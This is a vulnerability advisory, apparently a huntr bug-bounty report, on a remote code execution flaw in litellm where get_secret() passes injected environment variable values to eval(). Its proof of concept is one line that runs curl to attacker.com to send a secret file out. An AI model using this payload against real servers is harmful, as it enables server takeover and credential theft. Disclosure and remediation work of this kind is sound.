# Title: Remote Code Execution via Malicious Environment Variables in BerriAI/litellm

- **Platform**: Protect AI (huntr)
- **Program**: BerriAI/litellm (Open Source Bug Bounty)
- **Severity**: Critical
- **Date**: 2024-09-10
- **Researcher**: huntr community member
- **Bounty**: Not disclosed

## Summary
A critical Remote Code Execution (RCE) vulnerability was discovered in the BerriAI/litellm project, an open-source library for calling LLM APIs. The `litellm.get_secret()` function passed untrusted data to the `eval()` function without proper sanitization, allowing an attacker to execute arbitrary code on the server by injecting malicious environment variables.

## Technical Details
The vulnerability was found in the `/config/update` endpoint of litellm. This endpoint allowed updating environment variables. The `litellm.get_secret()` function used Python's `eval()` to resolve secret values, and untrusted data was passed to this function without adequate sanitization. By crafting a malicious environment variable value containing Python code, an attacker could achieve arbitrary code execution on the server.

## Steps to Reproduce
1. Identify a litellm instance with the `/config/update` endpoint exposed
2. Craft a request to update an environment variable with a malicious payload
3. The malicious code is passed to `eval()` via `get_secret()`
4. The code executes in the context of the server application

## Proof of Concept
```python
# Malicious environment variable value
import os; os.system('curl http://attacker.com/steal?key=$(cat /etc/secret)')
```

## Impact
- Complete server takeover
- Access to all environment variables and secrets (API keys for LLM providers)
- Data exfiltration of sensitive configuration
- Lateral movement within the network
- Potential compromise of LLM API credentials

## Remediation
- Remove usage of `eval()` for resolving configuration values
- Implement proper input validation and sanitization
- Use safe alternatives for string interpolation
- Restrict access to the `/config/update` endpoint
- Apply principle of least privilege to the application service account

## References
- https://sightline.protectai.com/vulnerabilities/0c220d75-47ff-49cc-9253-965986487739
- https://protectai.com/threat-research/september-vulnerability-report
